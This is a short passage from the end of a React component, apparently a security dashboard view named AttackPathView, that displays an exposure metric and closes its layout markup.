                <span className="text-sm font-bold text-[#00c8ff]">{data.metrics?.exposure ?? '—'}</span>
              </div>
            </div>
          </div>
        </div>

      </div>
    </div>
  );
};

export default AttackPathView;
